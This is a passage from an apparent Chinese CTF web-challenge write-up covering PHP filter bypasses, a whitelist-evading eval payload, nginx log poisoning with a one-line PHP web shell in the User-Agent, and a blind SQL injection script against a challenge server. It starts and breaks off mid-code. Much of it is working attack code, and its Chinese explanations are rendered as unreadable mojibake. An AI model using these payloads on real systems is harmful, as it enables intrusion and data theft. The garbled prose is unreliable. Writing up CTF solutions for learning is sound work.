&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"variable\">$num</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$num</span>) &lt; <span class=\"number\">2020</span> &amp;&amp; <span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$num</span> + <span class=\"number\">1</span>) &gt; <span class=\"number\">2021</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">die</span>(<span class=\"string\">&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">die</span>(<span class=\"string\">&quot;å»éæ´²å§&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//level 2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;md5&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"variable\">$md5</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;md5&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">if</span> (<span class=\"variable\">$md5</span> == <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$md5</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">else</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">die</span>(<span class=\"string\">&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">die</span>(<span class=\"string\">&quot;å»éæ´²å§&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//get flag</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;get_flag&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"variable\">$get_flag</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;get_flag&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">strstr</span>(<span class=\"variable\">$get_flag</span>, <span class=\"string\">&quot; &quot;</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable\">$get_flag</span> = <span class=\"title function_ invoke__\">str_ireplace</span>(<span class=\"string\">&quot;cat&quot;</span>, <span class=\"string\">&quot;wctf2020&quot;</span>, <span class=\"variable\">$get_flag</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$get_flag</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">die</span>(<span class=\"string\">&quot;å¿«åˆ°éæ´²äº†&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">die</span>(<span class=\"string\">&quot;å»éæ´²å§&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>ç¬¬ä¸€å…³ï¼Œå°è¯•ç»•è¿‡ intval å‡½æ•°<br>\nä¸åŠ  1 çš„æƒ…å†µä¸‹ï¼Œ1e10 è¢«è®¤ä¸ºæ˜¯å­—ç¬¦ä¸²ï¼Œintval (â€œ1e10â€) å°±æ˜¯ 1<br>\n ç„¶å &quot;1e10&quot;+1,&quot;1e10&quot; ä¼šè¢«è½¬æ¢æˆæ•´æ•°ï¼Œå°±æ˜¯ 1*10 çš„ 10 æ¬¡æ–¹å†åŠ  1</p>\n<p>ç¬¬äºŒå…³:<br>\n è¦æ±‚æ‰¾ä¸€ä¸ª md åŠ å¯†å‰åéƒ½æ˜¯ 0e å¼€å¤´çš„æ•°å­—</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0e215962017</span><br></pre></td></tr></table></figure>\n<p>ç¬¬ä¸‰å…³:<br>\n è¿‡æ»¤äº†ç©ºæ ¼ï¼Œcat<br>\n ç©ºæ ¼ç”¨ ${IFS} ä»£æ›¿ï¼Œcat ç”¨ <code>c\\at</code>  ä»£æ›¿</p>\n<h2 id=\"39ciscn-2019åˆèµ›love-math\"><a class=\"markdownIt-Anchor\" href=\"#39ciscn-2019åˆèµ›love-math\">#</a> 39.[CISCN 2019 åˆèµ›] Love Math</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"comment\">//ä¾‹å­ c=20-1</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"variable\">$content</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$content</span>) &gt;= <span class=\"number\">80</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">die</span>(<span class=\"string\">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"variable\">$blacklist</span> = [<span class=\"string\">&#x27; &#x27;</span>, <span class=\"string\">&#x27;\\t&#x27;</span>, <span class=\"string\">&#x27;\\r&#x27;</span>, <span class=\"string\">&#x27;\\n&#x27;</span>, <span class=\"string\">&#x27;\\&#x27;&#x27;</span>, <span class=\"string\">&#x27;&quot;&#x27;</span>, <span class=\"string\">&#x27;`&#x27;</span>, <span class=\"string\">&#x27;\\[&#x27;</span>, <span class=\"string\">&#x27;\\]&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">foreach</span> (<span class=\"variable\">$blacklist</span> <span class=\"keyword\">as</span> <span class=\"variable\">$blackitem</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$blackitem</span> . <span class=\"string\">&#x27;/m&#x27;</span>, <span class=\"variable\">$content</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">die</span>(<span class=\"string\">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"comment\">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"variable\">$whitelist</span> = [<span class=\"string\">&#x27;abs&#x27;</span>, <span class=\"string\">&#x27;acos&#x27;</span>, <span class=\"string\">&#x27;acosh&#x27;</span>, <span class=\"string\">&#x27;asin&#x27;</span>, <span class=\"string\">&#x27;asinh&#x27;</span>, <span class=\"string\">&#x27;atan2&#x27;</span>, <span class=\"string\">&#x27;atan&#x27;</span>, <span class=\"string\">&#x27;atanh&#x27;</span>, <span class=\"string\">&#x27;base_convert&#x27;</span>, <span class=\"string\">&#x27;bindec&#x27;</span>, <span class=\"string\">&#x27;ceil&#x27;</span>, <span class=\"string\">&#x27;cos&#x27;</span>, <span class=\"string\">&#x27;cosh&#x27;</span>, <span class=\"string\">&#x27;decbin&#x27;</span>, <span class=\"string\">&#x27;dechex&#x27;</span>, <span class=\"string\">&#x27;decoct&#x27;</span>, <span class=\"string\">&#x27;deg2rad&#x27;</span>, <span class=\"string\">&#x27;exp&#x27;</span>, <span class=\"string\">&#x27;expm1&#x27;</span>, <span class=\"string\">&#x27;floor&#x27;</span>, <span class=\"string\">&#x27;fmod&#x27;</span>, <span class=\"string\">&#x27;getrandmax&#x27;</span>, <span class=\"string\">&#x27;hexdec&#x27;</span>, <span class=\"string\">&#x27;hypot&#x27;</span>, <span class=\"string\">&#x27;is_finite&#x27;</span>, <span class=\"string\">&#x27;is_infinite&#x27;</span>, <span class=\"string\">&#x27;is_nan&#x27;</span>, <span class=\"string\">&#x27;lcg_value&#x27;</span>, <span class=\"string\">&#x27;log10&#x27;</span>, <span class=\"string\">&#x27;log1p&#x27;</span>, <span class=\"string\">&#x27;log&#x27;</span>, <span class=\"string\">&#x27;max&#x27;</span>, <span class=\"string\">&#x27;min&#x27;</span>, <span class=\"string\">&#x27;mt_getrandmax&#x27;</span>, <span class=\"string\">&#x27;mt_rand&#x27;</span>, <span class=\"string\">&#x27;mt_srand&#x27;</span>, <span class=\"string\">&#x27;octdec&#x27;</span>, <span class=\"string\">&#x27;pi&#x27;</span>, <span class=\"string\">&#x27;pow&#x27;</span>, <span class=\"string\">&#x27;rad2deg&#x27;</span>, <span class=\"string\">&#x27;rand&#x27;</span>, <span class=\"string\">&#x27;round&#x27;</span>, <span class=\"string\">&#x27;sin&#x27;</span>, <span class=\"string\">&#x27;sinh&#x27;</span>, <span class=\"string\">&#x27;sqrt&#x27;</span>, <span class=\"string\">&#x27;srand&#x27;</span>, <span class=\"string\">&#x27;tan&#x27;</span>, <span class=\"string\">&#x27;tanh&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"title function_ invoke__\">preg_match_all</span>(<span class=\"string\">&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;</span>, <span class=\"variable\">$content</span>, <span class=\"variable\">$used_funcs</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">foreach</span> (<span class=\"variable\">$used_funcs</span>[<span class=\"number\">0</span>] <span class=\"keyword\">as</span> <span class=\"variable\">$func</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$func</span>, <span class=\"variable\">$whitelist</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">die</span>(<span class=\"string\">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"comment\">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">eval</span>(<span class=\"string\">&#x27;echo &#x27;</span> . <span class=\"variable\">$content</span> . <span class=\"string\">&#x27;;&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>è®¡ç®—å™¨åŠŸèƒ½ï¼Œä¸€ä¸ªç™½åå•ï¼Œå¯ä»¥ç”¨ä¸€äº›å‡½æ•°ï¼Œå…¶ä»–å­—æ¯éƒ½ä¼šè¢«è¿‡æ»¤ï¼Œè¿˜æœ‰ä¸€ä¸ªé»‘åå•è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œé•¿åº¦ &lt;=80<br>\n è¿™é‡Œå­¦ä¹ ä¸€ä¸ªå‡½æ•° base_convert ()<br>\n å…·ä½“ç”¨æ³•çœ‹è¿™é‡Œ<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudzNzY2hvb2wuY29tLmNuL3BocC9mdW5jX21hdGhfYmFzZV9jb252ZXJ0LmFzcA==\">å‡½æ•°è¯­æ³•</span><br>\nè¿™é‡Œæ„é€ çš„é«˜è¿›åˆ¶æ•°å­—ä¼šå½“ä½œå­—ç¬¦ä¸²å¤„ç†ï¼Œè€Œä¸æ˜¯å½“ä½œæ•°å­—å¤„ç†<br>\nè¿™é‡Œæˆ‘ä»¬è¦æ„é€ _GET<br>\n ä»‹ç»ä¸¤ä¸ªå‡½æ•°:<br>\ndechex () å°†åè¿›åˆ¶è½¬æ¢æˆ 16 è¿›åˆ¶<br>\n hex2bin (): å°† 16 è¿›åˆ¶è½¬æ¢ä¸º ASCII ç </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[]è¢«é»‘åå•è¿‡æ»¤å¯ä»¥ç”¨&#123;&#125;æ›¿ä»£</span><br><span class=\"line\">_GETå¯ä»¥ç”¨hex2binè½¬æ¢,_GETçš„16è¿›åˆ¶æ˜¯5f 47 45 54</span><br><span class=\"line\">_GET=hex2bin(5f 47 45 54)</span><br><span class=\"line\">ä½†æ˜¯hex2binæ˜¯ç™½åå•ä»¥å¤–çš„å‡½æ•°,å¯ç”¨base_convertçš„é«˜è¿›åˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²,å³:</span><br><span class=\"line\">hex2bin=base_convert(37907361743,10,36)</span><br><span class=\"line\">è¿˜æœ‰:</span><br><span class=\"line\">5f 47 45 54ä¹Ÿä¸èƒ½ç›´æ¥å¡«,ä¼šè¢«åŒ¹é…å½“ä½œå‡½æ•°åæ”¾è¿›ç™½åå•ä¸­æ£€æŸ¥</span><br><span class=\"line\">5f474554=dechex(1598506324)</span><br><span class=\"line\">å› æ­¤:</span><br><span class=\"line\">_GET=hex2bin(5f 47 45 54)=base_convert(37907361743,10,36)(dechex(1598506324))</span><br><span class=\"line\"></span><br><span class=\"line\">payload:</span><br><span class=\"line\">?c=$cos=base_convert(37907361743,10,36)(dechex(1598506324));($$cos)&#123;1&#125;(($$cos)&#123;2&#125;)&amp;1=system&amp;2=cat /flag</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"40hnctf-2022-week2easy_include\"><a class=\"markdownIt-Anchor\" href=\"#40hnctf-2022-week2easy_include\">#</a> 40.[HNCTF 2022 WEEK2]easy_include</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//WEBæ‰‹è¦æ‡‚å¾—æœç´¢</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>])) &#123;</span><br><span class=\"line\">Â  Â  <span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\">Â  Â  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/php|flag|data|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=/i&quot;</span>, <span class=\"variable\">$file</span>)) &#123;</span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">die</span>(<span class=\"string\">&quot;error&quot;</span>);</span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\">Â  Â  <span class=\"keyword\">include</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">Â  Â  <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>data åè®®ä¸èƒ½ç”¨ï¼Œfile åè®®å¯ä»¥ç”¨</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file:///etc/passwd</span><br><span class=\"line\">ä½†æ˜¯è¿‡æ»¤äº†flagå’Œphpå…³é”®å­—</span><br></pre></td></tr></table></figure>\n<p>è¿™é‡Œå­¦åˆ°ä¸ªæ–°çŸ¥è¯†ï¼šæ—¥å¿—æ³¨å…¥<br>\næŠ“åŒ…ï¼Œæ”¹ï¼Ÿfile=/var/log/nginx/access.log<br>\n ç„¶ååœ¨ user-agent é‡Œå†™ä¸€å¥è¯æœ¨é©¬æˆ–è€…ç›´æ¥æ‰§è¡Œå‘½ä»¤å³å¯</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-Agent: &lt;?php system(&#x27;cat /ffflllaaaggg&#x27;);?&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php @eval($_GET[&#x27;a&#x27;]); ?&gt;</span><br><span class=\"line\">url:</span><br><span class=\"line\">?file=/var/log/nginx/access.log&amp;a=system(&#x27;cat /ffflllaaaggg&#x27;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"41nisactf-2022hardsql\"><a class=\"markdownIt-Anchor\" href=\"#41nisactf-2022hardsql\">#</a> 41.[NISACTF 2022]hardsql</h2>\n<p>è€ƒç‚¹:quine æ³¨å…¥<br>\nç”¨æˆ·ååªèƒ½æ˜¯ bilala, å¯†ç æ˜¯å­—ç¬¦å‹ï¼Œfuzz ä¸€ä¸‹å‘ç°ç©ºæ ¼è¢«è¿‡æ»¤ï¼Œç”¨ <code>/**/</code>  æ›¿ä»£<br>\nå¯ä»¥ç”¨å¸ƒå°”ç›²æ³¨è„šæœ¬è·‘å‡ºå¯†ç </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"> </span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://1.14.71.254:28860/login.php&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">str</span> = <span class=\"string\">&#x27;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">62</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">str</span>:</span><br><span class=\"line\">        data = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;username&#x27;</span>: <span class=\"string\">&#x27;bilala&#x27;</span>, <span class=\"string\">&quot;passwd&quot;</span>:<span class=\"string\">f&quot;-1&#x27;/**/or/**/passwd/**/like/**/&#x27;<span class=\"subst\">&#123;flag+j&#125;</span>%&#x27;#&quot;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        response = requests.post(url, data=data)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;nothing found&quot;</span> <span class=\"keyword\">not</span>  <span class=\"keyword\">in</span> response.text:</span><br><span class=\"line\">            flag = flag + j</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\"><span class=\"comment\">#b2f2d15b3ae082ca29697d8dcd420fd7</span></span><br></pre></td></tr></table></figure>\n<p>ç™»å½•å¾—åˆ°äº†æºç </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//å¤šåŠ äº†äº¿ç‚¹ç‚¹è¿‡æ»¤</span></span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include_once</span>(<span class=\"string\">&quot;config.php&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">alertMes</span>(<span 